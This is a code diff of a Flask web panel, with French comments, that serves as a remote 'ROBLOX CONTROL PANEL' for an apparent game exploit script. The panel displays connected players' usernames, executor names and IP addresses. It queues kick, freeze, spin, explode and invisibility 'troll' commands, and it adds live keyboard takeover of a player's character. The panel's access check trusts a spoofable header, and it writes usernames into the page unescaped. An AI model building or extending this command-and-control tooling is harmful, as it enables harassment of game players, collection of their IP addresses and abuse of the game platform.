@@ -6,7 +6,7 @@ import eventlet
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "change_me_123456789"
+app.config["SECRET_KEY"] = "change_me_to_something_long_123456789"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 # TES IP AUTORISÉES
@@ -15,7 +15,6 @@ ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
-controller_active = {}  # {userid: true/false}
 
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -43,7 +42,7 @@ def protect_routes():
     if request.path in ["/", "/kick", "/troll", "/control"]:
         check_ip()
 
-# HTML MODIFIÉ : + bouton Controller + affichage jeu
+# === PANEL HTML + Contrôle clavier réel ===
 HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -56,28 +55,23 @@ HTML = """<!DOCTYPE html>
 body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
 .container{max-width:1200px;margin:auto;padding:40px}
 h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
-.stats{text-align:center;margin:30px 0;font-size:1.8rem}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
-.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:25px}
+.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:all .3s}
 .card:hover{transform:translateY(-8px)}
-.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
-.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
-.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
-.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
-.name a{color:#ffcc00;text-decoration:none}
-.info{font-size:1rem;color:#aaa;margin-bottom:10px;line-height:1.5}
-.game{font-size:0.9rem;color:#0f0;background:#0008;padding:5px 10px;border-radius:8px;display:inline-block;margin-top:5px}
-.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
-button{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;color:white;transition:transform .2s;margin:4px}
+.name{font-size:1.8rem;color:#ffcc00}
+.info,.game{font-size:0.95rem;color:#aaa;margin:8px 0}
+.game{color:#0f0;background:#0008;padding:5px 10px;border-radius:8px;display:inline-block}
+button{padding:12px 16px;margin:4px 2px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;transition:.2s}
 button:hover{transform:scale(1.05)}
-.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);align-items:center;justify-content:center;z-index:1000}
+.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:999}
 .modal.active{display:flex}
-.controller-pad{background:#111;padding:30px;border-radius:20px;text-align:center;box-shadow:0 0 40px #00ffaa}
-.key{width:70px;height:70px;background:#333;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;font-size:1.5rem;margin:10px}
-.key:active{background:#00ffaa;color:#000}
+.controller{background:#111;padding:40px;border-radius:20px;text-align:center;box-shadow:0 0 50px #00ffaa}
+.key{width:80px;height:80px;background:#222;border-radius:15px;display:inline-flex;align-items:center;justify-content:center;font-size:2rem;margin:10px;transition:.1s}
+.key:active,.key.pressed{background:#00ffaa;color:#000}
 </style>
 </head>
 <body>
+
 <div class="container">
     <h1>ROBLOX CONTROL PANEL</h1>
     <div class="stats" id="stats">Players online: <b>0</b></div>
@@ -86,70 +80,73 @@ button:hover{transform:scale(1.05)}
 
 <!-- Controller Modal -->
 <div class="modal" id="controllerModal">
-    <div class="controller-pad">
-        <h2 style="color:#00ffaa;margin-bottom:20px">Controller <span id="ctrlName"></span></h2>
+    <div class="controller">
+        <h2 style="color:#00ffaa;margin-bottom:20px">Contrôle de <span id="ctrlName">???</span></h2>
+        <div style="margin-bottom:20px;color:#ff0">Utilise ton clavier ZQSD + Espace</div>
         <div>
-            <div class="key" id="keyZ" onmousedown="press('z')" onmouseup="release('z')" ontouchstart="press('z')" ontouchend="release('z')">Z</div>
+            <div class="key" id="keyZ">Z</div>
         </div>
         <div>
-            <div class="key" id="keyQ" onmousedown="press('q')" onmouseup="release('q')" ontouchstart="press('q')" ontouchend="release('q')">Q</div>
-            <div class="key" id="keyS" onmousedown="press('s')" onmouseup="release('s')" ontouchstart="press('s')" ontouchend="release('s')">S</div>
-            <div class="key" id="keyD" onmousedown="press('d')" onmouseup="release('d')" ontouchstart="press('d')" ontouchend="release('d')">D</div>
+            <div class="key" id="keyQ">Q</div>
+            <div class="key" id="keyS">S</div>
+            <div class="key" id="keyD">D</div>
         </div>
         <div style="margin-top:20px">
-            <div class="key" style="width:160px;height:70px;font-size:1.8rem" id="keySpace" onmousedown="press('space')" onmouseup="release('space')" ontouchstart="press('space')" ontouchend="release('space')">SPACE</div>
+            <div class="key" style="width:200px;height:70px;font-size:1.5rem" id="keySpace">ESPACE</div>
         </div>
-        <button style="margin-top:20px;background:#f33" onclick="closeController()">Fermer</button>
+        <button style="margin-top:25px;background:#f33;padding:15px 30px;font-size:1.2rem" onclick="closeController()">FERMER</button>
     </div>
 </div>
 
-<div class="toast-container" id="toasts"></div>
-
 <script>
 const socket = io();
-let currentPlayerId = null;
+let currentTarget = null;
 
-function toast(msg, type = "success") {
-    const t = document.createElement("div");
-    t.className = "toast " + (type === "danger" ? "danger" : "");
-    t.textContent = msg;
-    document.getElementById("toasts").appendChild(t);
-    setTimeout(() => t.remove(), 4000);
+function sendKey(key, down) {
+    if (!currentTarget) return;
+    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({userid:currentTarget, key:key, down:down})
+    });
 }
 
+document.addEventListener("keydown", e => {
+    if (!currentTarget) return;
+    const k = e.key.toLowerCase();
+    if ("zqsd ".includes(k) || k===" ") {
+        e.preventDefault();
+        const key = k===" "?"space":k;
+        if (!document.getElementById("key"+key.toUpperCase()).classList.contains("pressed")) {
+            sendKey(key, true);
+            document.getElementById("key"+key.toUpperCase()).classList.add("pressed");
+        }
+    }
+});
+
+document.addEventListener("keyup", e => {
+    if (!currentTarget) return;
+    const k = e.key.toLowerCase();
+    if ("zqsd ".includes(k) || k===" ") {
+        const key = k===" "?"space":k;
+        sendKey(key, false);
+        document.getElementById("key"+key.toUpperCase()).classList.remove("pressed");
+    }
+});
+
 function openController(id, name) {
-    currentPlayerId = id;
+    currentTarget = id;
     document.getElementById("ctrlName").textContent = name;
     document.getElementById("controllerModal").classList.add("active");
 }
 
 function closeController() {
+    // Relâche toutes les touches
+    ["z","q","s","d","space"].forEach(k => sendKey(k, false));
+    currentTarget = null;
     document.getElementById("controllerModal").classList.remove("active");
-    releaseAll();
-    currentPlayerId = null;
-}
-
-function press(key) {
-    if (!currentPlayerId) return;
-    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentPlayerId,key:key,down:true})});
-    document.getElementById("key"+key.toUpperCase()).style.background = "#00ffaa";
-    document.getElementById("key"+key.toUpperCase()).style.color = "#000";
-}
-
-function release(key) {
-    if (!currentPlayerId) return;
-    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentPlayerId,key:key,down:false})});
-    document.getElementById("key"+key.toUpperCase()).style.background = "#333";
-    document.getElementById("key"+key.toUpperCase()).style.color = "#fff";
-}
-
-function releaseAll() {
-    ["z","q","s","d","space"].forEach(k => release(k));
 }
 
 function sendTroll(id, cmd) {
-    fetch("/troll", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd})});
-    toast(cmd.toUpperCase() + " envoyé");
+    fetch("/troll", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd}));
 }
 
 function render(data) {
@@ -160,23 +157,24 @@ function render(data) {
         let card = document.getElementById(`card_${id}`) || document.createElement("div");
         card.className = "card"; card.id = `card_${id}`;
         card.innerHTML = `
-            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
-            <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}</div>
+            <div style="display:flex;justify-content:space-between;align-items:center">
+                <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank" style="color:#ffcc00">${p.username}</a> (${id})</div>
+                <div style="background:${p.online?"#0f0":"#f33"};padding:5px 10px;border-radius:8px;font-size:0.8rem">${p.online?"ON":"OFF"}</div>
+            </div>
+            <div class="info">Executor: ${p.executor} | IP: ${p.ip}</div>
             <div class="game">Jeu: ${p.game || "Inconnu"} (PlaceId: ${p.placeId || "???"})</div>
-            <div class="category">TROLLS</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
-                <button style="background:#ff3366" onclick="fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}',reason:'Kicked by admin'})})">KICK</button>
+            <div style="margin:15px 0 10px;font-weight:bold;color:#00ffaa">TROLLS</div>
+            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px">
+                <button style="background:#ff3366" onclick="fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}',reason:'Kicked'})})">KICK</button>
                 <button style="background:#ff00ff" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button style="background:#00ffff" onclick="sendTroll('${id}','spin')">SPIN</button>
-                <button style="background:#ffff00" onclick="sendTroll('${id}','jump')">JUMP</button>
                 <button style="background:#88ff88" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button style="background:#ff5555" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                 <button style="background:#5555ff" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button style="background:#00ff00" onclick="openController('${id}', '${p.username}')">CONTROLLER</button>
+                <button style="background:#6666ff" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
+                <button style="background:#00ff00;font-weight:bold" onclick="openController('${id}', '${p.username}')">CONTROLLER</button>
             </div>
-            <div class="category">UNDO</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+            <div style="margin-top:10px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
                 <button style="background:#666" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                 <button style="background:#666" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                 <button style="background:#666" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
@@ -213,10 +211,8 @@ def api():
                     "last": now,
                     "online": True
                 }
-                socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
-            elif d.get("action") == "heartbeat":
-                if uid in connected_players:
-                    connected_players[uid]["last"] = now
+            elif d.get("action") == "heartbeat" and uid in connected_players:
+                connected_players[uid]["last"] = now
         except: pass
         return jsonify({"ok": True})
 
@@ -236,8 +232,7 @@ def kick():
     check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
-    reason = data.get("reason", "Kicked by admin")
-    pending_kicks[uid] = reason
+    pending_kicks[uid] = data.get("reason", "Kicked")
     return jsonify({"sent": True})
 
 @app.route("/troll", methods=["POST"])
@@ -255,7 +250,7 @@ def control():
     check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
-    key = data.get("key", "")
+    key = data.get("key", "").lower()
     down = data.get("down", False)
     if uid and key in ["z","q","s","d","space"]:
         pending_commands[uid] = f"control_{key}_{'down' if down else 'up'}"
@@ -273,8 +268,7 @@ def broadcast_loop():
                 p["online"] = now - p["last"] < 15
                 if p["online"]: online += 1
         for uid in to_remove:
-            username = connected_players.pop(uid, {}).get("username", "Unknown")
-            socketio.emit("status", {"username": username, "online": False})
+            connected_players.pop(uid, None)
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
